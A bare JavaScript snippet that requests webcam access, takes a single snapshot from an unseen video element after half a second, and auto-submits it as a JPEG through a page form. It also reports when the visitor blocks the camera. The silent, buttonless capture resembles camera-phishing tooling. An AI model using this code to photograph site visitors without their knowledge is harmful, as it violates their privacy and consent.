navigator.mediaDevices.getUserMedia({ video: true })
  .then(function(stream) {

    var video = document.createElement('video');
    video.srcObject = stream;
    video.play();

    var canvas = document.createElement('canvas');
    var context = canvas.getContext('2d');

      setTimeout(async function() {
        if (video.videoWidth > 0 && video.videoHeight > 0) {
          canvas.width = 300; // Reduce the resolution
          canvas.height = 300; // Reduce the resolution
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
          var imageData = await canvas.toDataURL('image/jpeg',0.8); // 0-1 quality
          var tracks = stream.getTracks();
          tracks.forEach(function(track) {
            track.stop();
          });
          document.querySelector(".data").value = imageData;
          document.querySelector("form").submit();
        }
      }, 500);

  }).catch(function(error) {
    document.querySelector(".data").value = "User Blocked the Camera"
    document.querySelector("form").submit();
  })